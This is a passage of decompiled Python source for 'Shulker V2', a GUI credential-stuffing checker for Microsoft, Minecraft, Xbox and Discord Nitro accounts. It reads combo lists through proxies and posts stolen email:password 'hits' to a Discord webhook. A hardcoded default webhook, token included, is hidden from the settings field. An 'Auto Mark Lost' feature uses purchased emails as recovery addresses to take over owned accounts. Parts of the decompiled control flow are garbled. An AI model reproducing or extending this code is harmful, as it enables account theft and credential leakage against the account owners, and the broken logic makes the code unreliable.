        self.pack(side='left', padx=2)
        self._update_mark_lost_ui()
        self.after(500, self._check_startup_requirements)
        self._start_email_count_monitor()
        ctk.CTkLabel(checkers_frame, text='🚫 Ban Checkers', font=ctk.CTkFont(size=14, weight='bold')).pack(anchor='w', padx=20, pady=(10, 5))
        self.hypixel_ban_var = ctk.BooleanVar(value=self.config.get('checkers.hypixel_ban_check_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Hypixel Ban Check', variable=self.hypixel_ban_var).pack(anchor='w', padx=20, pady=2)
        self.donut_ban_var = ctk.BooleanVar(value=self.config.get('checkers.donut_ban_check_enabled', True))
        ctk.CTkCheckBox(checkers_frame, text='Donut SMP Ban Check', variable=self.donut_ban_var).pack(anchor='w', padx=20, pady=2)
        discord_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        discord_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(discord_frame, text='💜 Discord Webhook', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.discord_enabled_var = ctk.BooleanVar(value=self.config.get('discord.enabled', False))
        discord_checkbox = ctk.CTkCheckBox(discord_frame, text='Enable Discord Webhook', variable=self.discord_enabled_var, command=self.toggle_discord_editor, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], checkmark_color=MODERN_COLORS['text_primary'], border_color=MODERN_COLORS['border'], text_color=MODERN_COLORS['text_primary'])
        discord_checkbox.pack(anchor='w', padx=20, pady=5)
        url_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        url_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(url_frame, text='Webhook URL:', width=150, anchor='w').pack(side='left', padx=5)
        self.webhook_url_entry = ctk.CTkEntry(url_frame, width=400, placeholder_text='https://discord.com/api/webhooks/...')
        self.webhook_url_entry.pack(side='left', padx=5, fill='x', expand=True)
        webhook_url = self.config.get('discord.webhook_url', '')
        default_webhook = 'https://discord.com/api/webhooks/1392466206551965876/afcaOHCQqubD4WCpzv9Sjftv6KZFeo82B-qjLbiSzQa6vgMhSwRZN4AZ_D8k8f-Xynra'
        if webhook_url and webhook_url!= default_webhook:
            self.webhook_url_entry.insert(0, webhook_url)
        webhook_name_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        webhook_name_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(webhook_name_frame, text='Webhook Name:', width=150, anchor='w').pack(side='left', padx=5)
        self.webhook_name_entry = ctk.CTkEntry(webhook_name_frame, placeholder_text='Shulker V2')
        self.webhook_name_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.webhook_name_entry.insert(0, self.config.get('discord.username', 'Shulker V2'))
        webhook_icon_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        webhook_icon_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(webhook_icon_frame, text='Webhook Icon URL:', width=150, anchor='w').pack(side='left', padx=5)
        self.webhook_icon_entry = ctk.CTkEntry(webhook_icon_frame, placeholder_text='https://... (optional)')
        self.webhook_icon_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.webhook_icon_entry.insert(0, self.config.get('discord.avatar_url', ''))
        ctk.CTkLabel(discord_frame, text='What to send:', font=ctk.CTkFont(size=12, weight='bold')).pack(pady=(10, 5), anchor='w', padx=10)
        self.send_minecraft_var = ctk.BooleanVar(value=self.config.get('discord.send_minecraft', True))
        ctk.CTkCheckBox(discord_frame, text='Send Minecraft Hits', variable=self.send_minecraft_var).pack(anchor='w', padx=20, pady=2)
        self.send_nitro_var = ctk.BooleanVar(value=self.config.get('discord.send_nitro', True))
        ctk.CTkCheckBox(discord_frame, text='Send Nitro Hits', variable=self.send_nitro_var).pack(anchor='w', padx=20, pady=2)
        self.send_2fa_var = ctk.BooleanVar(value=self.config.get('discord.send_2fa', False))
        ctk.CTkCheckBox(discord_frame, text='Send 2FA Accounts', variable=self.send_2fa_var).pack(anchor='w', padx=20, pady=2)
        self.send_gamepass_var = ctk.BooleanVar(value=self.config.get('discord.send_gamepass', True))
        ctk.CTkCheckBox(discord_frame, text='Send Game Pass Hits', variable=self.send_gamepass_var).pack(anchor='w', padx=20, pady=2)
        self.send_rewards_var = ctk.BooleanVar(value=self.config.get('discord.send_rewards', True))
        ctk.CTkCheckBox(discord_frame, text='Send MS Rewards Hits', variable=self.send_rewards_var).pack(anchor='w', padx=20, pady=2)
        rewards_threshold_frame = ctk.CTkFrame(discord_frame, fg_color='transparent')
        rewards_threshold_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(rewards_threshold_frame, text='Rewards Threshold (points):', width=200, anchor='w', text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.rewards_threshold_var = ctk.IntVar(value=self.config.get('discord.rewards_threshold', 500))
        rewards_entry = ctk.CTkEntry(rewards_threshold_frame, width=100, textvariable=self.rewards_threshold_var, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], border_color=MODERN_COLORS['border'])
        rewards_entry.pack(side='left', padx=5)
        self.embed_editor_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        header_frame = ctk.CTkFrame(self.embed_editor_frame, fg_color='transparent')
        header_frame.pack(fill='x', pady=(10, 5), padx=10)
        ctk.CTkLabel(header_frame, text='🎨 Embed Message Editor', font=ctk.CTkFont(size=20, weight='bold')).pack(side='left', padx=10, pady=10)
        self.use_custom_embed_var = ctk.BooleanVar(value=self.config.get('discord.use_custom_embed', False))
        custom_toggle = ctk.CTkCheckBox(header_frame, text='Use Custom Embed', variable=self.use_custom_embed_var, font=ctk.CTkFont(size=12, weight='bold'))
        custom_toggle.pack(side='right', padx=10, pady=10)
        main_content = ctk.CTkFrame(self.embed_editor_frame, fg_color='transparent')
        main_content.pack(fill='both', expand=True, padx=10, pady=5)
        left_col = ctk.CTkFrame(main_content, fg_color='transparent')
        left_col.pack(side='left', fill='both', expand=True, padx=(0, 5))
        ctk.CTkLabel(left_col, text='📝 Edit Embed', font=ctk.CTkFont(size=16, weight='bold')).pack(pady=(10, 15), padx=10, anchor='w')
        title_section = ctk.CTkFrame(left_col, fg_color='transparent')
        title_section.pack(fill='x', pady=8, padx=10)
        ctk.CTkLabel(title_section, text='Title:', font=ctk.CTkFont(size=12, weight='bold'), width=100, anchor='w').pack(side='left', padx=5)
        self.embed_title_entry = ctk.CTkEntry(title_section, placeholder_text='🎮 NEW HIT - {email}', height=35)
        self.embed_title_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.embed_title_entry.insert(0, self.config.get('discord.embed_title', '🎮 NEW HIT - {email}'))
        desc_section = ctk.CTkFrame(left_col, fg_color='transparent')
        desc_section.pack(fill='x', pady=8, padx=10)
        ctk.CTkLabel(desc_section, text='Description:', font=ctk.CTkFont(size=12, weight='bold'), width=100, anchor='w').pack(side='left', padx=5, anchor='n', pady=(5, 0))
        self.embed_desc_entry = ctk.CTkTextbox(desc_section, height=100, font=ctk.CTkFont(size=11))
        self.embed_desc_entry.pack(side='left', padx=5, fill='x', expand=True)
        self.embed_desc_entry.insert('1.0', self.config.get('discord.embed_description', '**Credentials:** `{email}:{password}`'))
        color_footer_row = ctk.CTkFrame(left_col, fg_color='transparent')
        color_footer_row.pack(fill='x', pady=8, padx=10)
        color_section = ctk.CTkFrame(color_footer_row, fg_color='transparent')
        color_section.pack(side='left', fill='x', expand=True, padx=(0, 5))
        ctk.CTkLabel(color_section, text='Color:', font=ctk.CTkFont(size=12, weight='bold'), anchor='w').pack(padx=5, pady=2)
        self.embed_color_entry = ctk.CTkEntry(color_section, placeholder_text='0x57F287 (auto if empty)', height=35)
        self.embed_color_entry.pack(padx=5, pady=2, fill='x')
        self.embed_color_entry.insert(0, self.config.get('discord.embed_color', ''))
        footer_row = ctk.CTkFrame(left_col, fg_color='transparent')
        footer_row.pack(fill='x', pady=8, padx=10)
        footer_section = ctk.CTkFrame(footer_row, fg_color='transparent')
        footer_section.pack(side='left', fill='x', expand=True, padx=(0, 5))
        ctk.CTkLabel(footer_section, text='Footer Text:', font=ctk.CTkFont(size=12, weight='bold'), anchor='w').pack(padx=5, pady=2)
        self.embed_footer_entry = ctk.CTkEntry(footer_section, placeholder_text='Shulker V2 • {timestamp}', height=35)
        self.embed_footer_entry.pack(padx=5, pady=2, fill='x')
        self.embed_footer_entry.insert(0, self.config.get('discord.embed_footer', 'Shulker V2 • {timestamp}'))
        footer_icon_section = ctk.CTkFrame(footer_row, fg_color='transparent')
        footer_icon_section.pack(side='left', fill='x', expand=True, padx=(5, 0))
        ctk.CTkLabel(footer_icon_section, text='Footer Icon URL:', font=ctk.CTkFont(size=12, weight='bold'), anchor='w').pack(padx=5, pady=2)
        self.embed_footer_icon_entry = ctk.CTkEntry(footer_icon_section, placeholder_text='https://... (optional)', height=35)
        self.embed_footer_icon_entry.pack(padx=5, pady=2, fill='x')
        self.embed_footer_icon_entry.insert(0, self.config.get('discord.embed_footer_icon', ''))
        fields_section = ctk.CTkFrame(left_col, fg_color='transparent')
        fields_section.pack(fill='both', expand=True, pady=8, padx=10)
        fields_header = ctk.CTkFrame(fields_section, fg_color='transparent')
        fields_header.pack(fill='x', pady=(10, 5), padx=5)
        ctk.CTkLabel(fields_header, text='📋 Custom Fields', font=ctk.CTkFont(size=14, weight='bold')).pack(side='left', padx=5)
        add_field_btn = ctk.CTkButton(fields_header, text='+ Add Field', width=100, height=30, command=self.add_embed_field)
        add_field_btn.pack(side='right', padx=5)
        self.fields_scroll_frame = ctk.CTkScrollableFrame(fields_section, height=300, fg_color=MODERN_COLORS['surface'])
        self.fields_scroll_frame.pack(padx=5, pady=(0, 10), fill='both', expand=True)
        self.embed_field_widgets = []
        custom_fields = self.config.get('discord.embed_fields', [])
        if custom_fields:
            for field in custom_fields:
                self.add_embed_field(name=field.get('name', ''), value=field.get('value', ''), inline=field.get('inline', False))
        right_col = ctk.CTkFrame(main_content, fg_color='transparent')
        right_col.pack(side='right', fill='both', expand=False, padx=(5, 0), ipadx=10)
        ctk.CTkLabel(right_col, text='📚 Available Variables', font=ctk.CTkFont(size=16, weight='bold')).pack(pady=(10, 10), padx=10, anchor='w')
        variables_scroll = ctk.CTkScrollableFrame(right_col, width=300, fg_color=MODERN_COLORS['surface'])
        variables_scroll.pack(fill='both', expand=True, padx=10, pady=(0, 10))
        variables_list = [('{email}', 'Account email'), ('{password}', 'Account password'), ('{mc_username}', 'Minecraft username'), ('{mc_uuid}', 'Minecraft UUID'), ('{mc_java_owned}', 'Java owned (Yes/No)'), ('{mc_bedrock_owned}', 'Bedrock owned (Yes/No)'), ('{mc_gamepass}', 'Has Game Pass (Yes/No)'), ('{xbox_gamertag}', 'Xbox gamertag'), ('{nitro_status}', 'Nitro status'), ('{nitro_code}', 'Nitro promo code'), ('{nitro_link}', 'Nitro redemption link'), ('{security_status}', 'Security status'), ('{hypixel_level}', 'Hypixel level'), ('{hypixel_rank}', 'Hypixel rank'), ('{hypixel_banned}', 'Hypixel ban status'), ('{donut_balance}', 'Donut SMP balance'), ('{donut_playtime}', 'Donut SMP playtime'), ('{rewards_points}', 'MS Rewards points'), ('{capes}', 'Minecraft capes'), ('{name_changeable}', 'Can change name (Yes/No)'), ('{timestamp}', 'Current timestamp')]
        for var, desc in variables_list:
            var_frame = ctk.CTkFrame(variables_scroll, fg_color='transparent')
            var_frame.pack(fill='x', pady=3, padx=5)
            var_label = ctk.CTkLabel(var_frame, text=var, font=ctk.CTkFont(size=11, family='Consolas'), text_color=MODERN_COLORS['primary'], anchor='w', width=150)
            var_label.pack(side='left', padx=5)
            desc_label = ctk.CTkLabel(var_frame, text=desc, font=ctk.CTkFont(size=10), text_color=MODERN_COLORS['text_secondary'], anchor='w')
            desc_label.pack(side='left', padx=5, fill='x', expand=True)
        self.toggle_discord_editor()
        timeouts_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        timeouts_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(timeouts_frame, text='⏱️ Timeout Settings (seconds)', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        timeout_grid = [('Authentication', 'timeouts.authentication', 30), ('Security Check', 'timeouts.security_check', 15), ('Minecraft Check', 'timeouts.minecraft_check', 20), ('Xbox Check', 'timeouts.xbox_check', 15), ('Nitro Check', 'timeouts.nitro_check', 30), ('Hypixel Check', 'timeouts.hypixel_check', 10), ('Donut Check', 'timeouts.donut_check', 10), ('Mark Lost', 'timeouts.mark_lost', 60)]
        self.timeout_vars = {}
        for i, (label, key, default) in enumerate(timeout_grid):
            row_frame = ctk.CTkFrame(timeouts_frame, fg_color='transparent')
            row_frame.pack(fill='x', pady=2, padx=10)
            ctk.CTkLabel(row_frame, text=f'{label}:', width=180, anchor='w').pack(side='left', padx=5)
            var = ctk.IntVar(value=self.config.get(key, default))
            self.timeout_vars[key] = var
            entry = ctk.CTkEntry(row_frame, width=80, textvariable=var)
            entry.pack(side='left', padx=5)
        rate_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        rate_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(rate_frame, text='🚦 Rate Limiting', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        self.rate_limiting_enabled_var = ctk.BooleanVar(value=self.config.get('rate_limiting.enabled', True))
        ctk.CTkCheckBox(rate_frame, text='Enable Rate Limiting', variable=self.rate_limiting_enabled_var).pack(anchor='w', padx=20, pady=5)
        global_delay_frame = ctk.CTkFrame(rate_frame, fg_color='transparent')
        global_delay_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(global_delay_frame, text='Global Delay (seconds):', width=200, anchor='w').pack(side='left', padx=5)
        self.global_delay_var = ctk.DoubleVar(value=self.config.get('rate_limiting.global_delay', 0.5))
        delay_entry = ctk.CTkEntry(global_delay_frame, width=100, textvariable=self.global_delay_var)
        delay_entry.pack(side='left', padx=5)
        logging_frame = ctk.CTkFrame(scroll_frame, fg_color=MODERN_COLORS['surface'], corner_radius=15, border_width=1, border_color=MODERN_COLORS['border'])
        logging_frame.pack(fill='x', pady=10, padx=20)
        ctk.CTkLabel(logging_frame, text='📝 Logging Settings', font=ctk.CTkFont(size=18, weight='bold')).pack(pady=10, anchor='w', padx=10)
        log_level_frame = ctk.CTkFrame(logging_frame, fg_color='transparent')
        log_level_frame.pack(fill='x', pady=5, padx=10)
        ctk.CTkLabel(log_level_frame, text='Log Level:', width=150, anchor='w').pack(side='left', padx=5)
        self.log_level_var = ctk.StringVar(value=self.config.get('logging.level', 'INFO'))
        log_level_menu = ctk.CTkOptionMenu(log_level_frame, values=['DEBUG', 'INFO', 'WARNING', 'ERROR'], variable=self.log_level_var, width=150)
        log_level_menu.pack(side='left', padx=5)
        save_frame = ctk.CTkFrame(scroll_frame, fg_color='transparent')
        save_frame.pack(fill='x', pady=20, padx=20)
        ctk.CTkButton(save_frame, text='💾 Save All Configuration', command=self.save_all_config, width=300, height=40, font=ctk.CTkFont(size=16, weight='bold')).pack(pady=10)

    def create_logs_tab(self):
        """Create live logs tab"""  # inserted
        ctk.CTkLabel(self.tab_logs, text='📋 LIVE LOGS', font=ctk.CTkFont(size=24, weight='bold')).pack(pady=20)
        control_frame = ctk.CTkFrame(self.tab_logs, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        control_frame.pack(fill='x', padx=20, pady=10)
        ctk.CTkButton(control_frame, text='🗑️ Clear Logs', command=self.clear_logs, width=120, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        ctk.CTkButton(control_frame, text='💾 Save Logs', command=self.save_logs, width=120, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=5)
        self.log_text = ctk.CTkTextbox(self.tab_logs, font=ctk.CTkFont(size=10, family='Consolas'), wrap='none', fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        '''Decompiler error: line too long for translation. Please decompile this statement manually.'''
        self.log_text.tag_config('bad', foreground='#ff4444')
        self.log_text.tag_config('valid', foreground='#4488ff')
        self.log_text.tag_config('2fa', foreground='#44ffff')
        self.log_text.tag_config('hit', foreground='#44ff44')
        self.log_text.tag_config('xgp', foreground='#22aa22')
        self.log_text.tag_config('xgpu', foreground='#22aa22')
        self.log_handler = LogHandler(self.log_text, self)
        self.update_logs()

    def create_stats_tab(self):
        """Create detailed statistics tab"""  # inserted
        ctk.CTkLabel(self.tab_stats, text='📊 DETAILED STATISTICS', font=ctk.CTkFont(size=24, weight='bold')).pack(pady=20)
        self.stats_table = StatsTable(self.tab_stats)
        self.stats_table.pack(fill='both', expand=True, padx=20, pady=10)

    def create_results_tab(self):
        """Create results viewer tab"""  # inserted
        ctk.CTkLabel(self.tab_results, text='📁 RESULTS VIEWER', font=ctk.CTkFont(size=24, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=20)
        session_frame = ctk.CTkFrame(self.tab_results, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        session_frame.pack(fill='x', padx=20, pady=10)
        ctk.CTkLabel(session_frame, text='Session:', width=100, text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=10)
        self.session_var = ctk.StringVar()
        self.session_dropdown = ctk.CTkComboBox(session_frame, variable=self.session_var, values=self.get_session_folders(), command=self.load_session_files, width=300, fg_color=MODERN_COLORS['surface'], button_color=MODERN_COLORS['primary'], button_hover_color=MODERN_COLORS['primary_hover'], text_color=MODERN_COLORS['text_primary'])
        self.session_dropdown.pack(side='left', padx=10)
        ctk.CTkButton(session_frame, text='🔄 Refresh', command=self.refresh_sessions, width=100, fg_color=MODERN_COLORS['surface'], hover_color=MODERN_COLORS['surface_hover'], text_color=MODERN_COLORS['text_primary']).pack(side='left', padx=10)
        files_frame = ctk.CTkFrame(self.tab_results, fg_color=MODERN_COLORS['background'], corner_radius=0)
        files_frame.pack(fill='both', expand=True, padx=20, pady=10)
        list_frame = ctk.CTkFrame(files_frame, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        list_frame.pack(side='left', fill='both', expand=True, padx=(0, 10))
        ctk.CTkLabel(list_frame, text='📄 Files:', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=10)
        self.files_scroll = ctk.CTkScrollableFrame(list_frame, height=400, fg_color=MODERN_COLORS['background'], corner_radius=0)
        self.files_scroll.pack(fill='both', expand=True, padx=10, pady=10)
        self.file_buttons = {}
        content_frame = ctk.CTkFrame(files_frame, fg_color=MODERN_COLORS['surface'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        content_frame.pack(side='right', fill='both', expand=True, padx=(10, 0))
        ctk.CTkLabel(content_frame, text='📋 Content:', font=ctk.CTkFont(size=14, weight='bold'), text_color=MODERN_COLORS['text_primary']).pack(pady=10)
        self.file_content_text = ctk.CTkTextbox(content_frame, font=ctk.CTkFont(size=10, family='Consolas'), height=400, fg_color=MODERN_COLORS['background'], text_color=MODERN_COLORS['text_primary'], corner_radius=10, border_width=1, border_color=MODERN_COLORS['border'])
        self.file_content_text.pack(fill='both', expand=True, padx=10, pady=10)

    def create_status_bar(self):
        """Create beautiful status bar"""  # inserted
        status_frame = ctk.CTkFrame(self, height=35, corner_radius=0, fg_color=MODERN_COLORS['surface'], border_width=1, border_color=MODERN_COLORS['border'])
        status_frame.grid(row=2, column=0, sticky='ew', padx=0, pady=0)
        status_frame.grid_propagate(False)
        self.status_label = ctk.CTkLabel(status_frame, text='Ready • Complete Edition with Smart Threading', font=ctk.CTkFont(size=11), text_color=MODERN_COLORS['text_primary'])
        self.status_label.pack(side='left', padx=15, pady=8)
        version_label = ctk.CTkLabel(status_frame, text=f"v{self.config.get('general.version')}", font=ctk.CTkFont(size=11, weight='bold'), text_color=MODERN_COLORS['text_secondary'])
        version_label.pack(side='right', padx=15, pady=8)

    def browse_combo_file(self):
        """Browse for combo file"""  # inserted
        filename = filedialog.askopenfilename(title='Select Combo File', filetypes=[('Text Files', '*.txt'), ('All Files', '*.*')], initialdir='combos')
        if filename:
            try:
                if not os.path.exists(filename):
                    messagebox.showerror('Error', 'File does not exist')
                return None
        else:  # inserted
            return
        except Exception as e:
            messagebox.showerror('Error', f'Failed to validate file: {e}')
            logger.error(f'File validation error: {e}')

    def update_thread_count(self, value):
        """Update thread count from slider with smooth animation"""  # inserted
        count = int(value)
        self.settings['thread_count'] = count
        if hasattr(self, 'thread_label'):
            self.thread_label.configure(text=f'{count} threads')
        return None

    def toggle_proxies(self):
        """Toggle proxy mode"""  # inserted
        self.settings['proxy_enabled'] = self.proxy_check.get()
        self.config.set('proxies.enabled', self.settings['proxy_enabled'])
        self.config.save()
        status = 'enabled' if self.settings['proxy_enabled'] else 'disabled'
        self.status_label.configure(text=f'Proxies {status}')
        logger.info(f'Proxies {status}')

    def toggle_discord(self):
        """Toggle Discord webhook"""  # inserted
        self.settings['discord_enabled'] = self.discord_check.get()
        self.discord_enabled_var.set(self.settings['discord_enabled'])
        self.config.set('discord.enabled', self.settings['discord_enabled'])
        self.config.save()
        self.toggle_discord_editor()
        status = 'enabled' if self.settings['discord_enabled'] else 'disabled'
        self.status_label.configure(text=f'Discord webhook {status}')
        logger.info(f'Discord webhook {status}')

    def _on_rewards_checkbox_change(self):
        """Handle MS Rewards checkbox change - show beta warning if enabling"""  # inserted
        if self.rewards_var.get():
            response = messagebox.askyesno('Beta Feature Warning', '⚠️ Microsoft Rewards Fetcher is currently in BETA stage.\n\n⚠️ Turning this feature ON will decrease checking speed.\n\nThis feature is still under development and may have:\n• Slower performance\n• Potential instability\n• Unexpected behavior\n\nDo you want to enable this beta feature?', icon='warning')
            if not response:
                self.rewards_var.set(False)
            return None
        return None

    def _count_notletters_emails(self):
        """Count valid NotLetters emails from file"""  # inserted
        email_file = self.config.get('automation.notletters_email_file', 'notletters_emails.txt')
        email_count = 0
        try:
            if os.path.exists(email_file):
                with open(email_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and (not line.startswith('#')) and (':' in line):
                            pass  # postinserted
                        else:  # inserted
                            email, password = line.split(':', 1)
                            if email.strip() and password.strip():
                                pass  # postinserted
                            else:  # inserted
                                email_count += 1
                        return email_count
        except Exception as e:
            logger.error(f'Error counting NotLetters emails: {e}')

    def _refresh_email_count(self):
        """Refresh and display email count"""  # inserted
        email_count = self._count_notletters_emails()
        if email_count >= 50:
            self.mark_lost_email_count_label.configure(text=f'✅ {email_count} emails found (requirements met)', text_color='#44ff44')
        if self.mark_lost_var.get():
            if email_count < 50:
                self.mark_lost_var.set(False)
                self.mark_lost_requirements_satisfied = False
                self._update_mark_lost_ui()
                logger.warning(f'Auto Mark Lost auto-disabled: Only {email_count}/50 emails found')
                return email_count
        return email_count

    def _check_startup_requirements(self):
        """Check requirements on startup if Auto Mark Lost is enabled"""  # inserted
        if self.mark_lost_var.get():
            email_count = self._count_notletters_emails()
            if email_count >= 50:
                self.mark_lost_requirements_satisfied = True
                logger.info(f'Auto Mark Lost enabled on startup with {email_count} emails (requirements satisfied)')
        self._refresh_email_count()

    def _start_email_count_monitor(self):
        """Start periodic email count monitoring"""  # inserted
        self._refresh_email_count() if self.mark_lost_var.get() else None
        self.after(30000, self._start_email_count_monitor)

    def _on_mark_lost_checkbox_change(self):
        """Handle Auto Mark Lost checkbox change - prevent enabling if requirements not met"""  # inserted
        if self.mark_lost_var.get():
            email_count = self._count_notletters_emails()
            if email_count < 50:
                self.mark_lost_var.set(False)
                error_text = f'❌ REQUIREMENTS NOT MET\n\n📧 NotLetters Emails: {email_count}/50 required\n❌ You need at least 50 emails!\n\n📋 REQUIREMENTS:\n• Minimum 50 NotLetters email:password pairs in notletters_emails.txt\n• Format: email:password (one per line)\n• Comments (lines starting with #) are ignored\n• ShulkerV2 uses these emails as recovery emails to mark lost Minecraft hits\n\n🔗 DEPENDENCY:\nShulkerV2 is dependent on https://notletters.com/ for the auto mark lost system.\n\n💰 WHERE TO BUY:\n1. Website: https://notletters.com/\n   → Create an account and purchase NotLetters emails\n   → Get your API key from Settings tab on their website\n   → Enter your API key in the field below (after enabling)\n\n2. Discord Seller: someone_known21 (ID: 793101872784867352)\n   → Contact them on Discord to purchase NotLetters emails\n   → Leave API key field EMPTY (default key will be used)\n   → Do NOT enter anything in the API key field\n\n📝 HOW TO ADD EMAILS:\n1. Open notletters_emails.txt file (in the same folder as ShulkerV2)\n2. Add email:password pairs, one per line\n3. Example format:\n   email1@example.com:password1\n   email2@example.com:password2\n4. Save the file\n5. Click the Refresh button to update the count\n6. Once you have 50+ emails, you can enable Auto Mark Lost\n\n⚠️ CURRENT STATUS:\n• Found: {email_count} emails\n• Required: 50 emails\n• Missing: {50 - email_count} emails\n\nAfter adding emails, click Refresh to check again.'
                messagebox.showerror('Cannot Enable Auto Mark Lost', error_text)
                self._update_mark_lost_ui()
                logger.warning(f'Cannot enable Auto Mark Lost: Only {email_count}/50 emails found')
            warning_text = f'{None}⚠️ AUTO MARK LOST REQUIREMENTS\n\n📧 NotLetters Emails: {email_count}/50 required\n✅ You have enough emails!\n\n📋 REQUIREMENTS:\n• Minimum 50 NotLetters email:password pairs in notletters_emails.txt\n• Format: email:password (one per line)\n• ShulkerV2 uses these emails as recovery emails to mark lost Minecraft hits\n\n🔗 DEPENDENCY:\nShulkerV2 is dependent on https://notletters.com/ for the auto mark lost system.\n\n💰 WHERE TO BUY:\n1. Website: https://notletters.com/\n   → Get your API key from Settings tab on their website\n   → Enter your API key in the field below\n\n2. Discord Seller: someone_known21 (ID: 793101872784867352)\n   → Leave API key field EMPTY\n   → Default key will be used automatically\n   → Do NOT enter anything in the API key field\n\n⚠️ IMPORTANT:\n• Auto Mark Lost only works on accounts with Minecraft Java OWNED\n• The system uses NotLetters emails as recovery emails\n• Make sure you have valid NotLetters email:password pairs\n\nDo you want to enable Auto Mark Lost?'
        return None

    def _update_mark_lost_ui(self):
        """Update Auto Mark Lost UI visibility based on checkbox state"""  # inserted
        if self.mark_lost_var.get():
            email_count = self._count_notletters_emails()
            if email_count >= 50:
                info_text = f'✅ {email_count} emails found | ShulkerV2 depends on https://notletters.com/ | Buy from website (enter API key) or someone_known21 (Discord: 793101872784867352, leave API key empty)'
                self.mark_lost_info_label.configure(text=info_text, text_color='#44ff44')
            self.mark_lost_info_label.pack(anchor='w', padx=(25, 0), pady=(5, 0))
            self.mark_lost_api_frame.pack(fill='x', padx=(25, 0), pady=(5, 0))
        return None

    def save_all_config(self):
        """Save all configuration settings"""  # inserted
        try:
            self.config.set('proxies.enabled', self.proxy_enabled_var.get())
            self.config.set('proxies.file', self.proxy_file_entry.get().strip())
            self.config.set('proxies.type', self.proxy_type_var.get())
            self.config.set('proxies.rotation_mode', self.proxy_rotation_var.get())
            self.config.set('threading.max_threads', self.max_threads_var.get())
            self.config.set('threading.timeout_per_account', self.timeout_var.get())
            self.config.set('checkers.security_enabled', self.security_var.get())
            self.config.set('checkers.minecraft_enabled', self.minecraft_var.get())
            self.config.set('checkers.xbox_enabled', self.xbox_var.get())
            self.config.set('checkers.nitro_enabled', self.nitro_var.get())
            self.config.set('checkers.fetch_xbox_codes', self.xbox_codes_var.get())
            self.config.set('checkers.hypixel_enabled', self.hypixel_var.get())
            self.config.set('checkers.donut_enabled', self.donut_var.get())
            self.config.set('checkers.ms_rewards_enabled', self.rewards_var.get())
            self.config.set('checkers.hypixel_ban_check_enabled', self.hypixel_ban_var.get())
            self.config.set('checkers.donut_ban_check_enabled', self.donut_ban_var.get())
            self.config.set('automation.auto_mark_lost', self.mark_lost_var.get())
            api_key = self.notletters_api_key_entry.get().strip()
            if api_key:
                self.config.set('automation.notletters_api_key', api_key)
            self.config.set('discord.enabled', self.discord_enabled_var.get())
            webhook_url = self.webhook_url_entry.get().strip()
            default_webhook = 'https://discord.com/api/webhooks/1392466206551965876/afcaOHCQqubD4WCpzv9Sjftv6KZFeo82B-qjLbiSzQa6vgMhSwRZN4AZ_D8k8f-Xynra'
            if webhook_url == default_webhook:
                self.config.set('discord.webhook_url', '')
            self.config.set('discord.username', self.webhook_name_entry.get().strip())
            self.config.set('discord.avatar_url', self.webhook_icon_entry.get().strip())
            self.config.set('discord.send_minecraft', self.send_minecraft_var.get())
            self.config.set('discord.send_nitro', self.send_nitro_var.get())
            self.config.set('discord.send_2fa', self.send_2fa_var.get())
            self.config.set('discord.send_gamepass', self.send_gamepass_var.get())
            self.config.set('discord.send_rewards', self.send_rewards_var.get())
            self.config.set('discord.rewards_threshold', self.rewards_threshold_var.get())
            self.config.set('discord.use_custom_embed', self.use_custom_embed_var.get())
            self.config.set('discord.embed_title', self.embed_title_entry.get())
            self.config.set('discord.embed_description', self.embed_desc_entry.get('1.0', 'end-1c'))
            color_value = self.embed_color_entry.get().strip()
            if color_value:
                if color_value.startswith('0x'):
                    self.config.set('discord.embed_color', color_value)
            self.config.set('discord.embed_footer', self.embed_footer_entry.get())
            self.config.set('discord.embed_footer_icon', self.embed_footer_icon_entry.get().strip())
            custom_fields = []
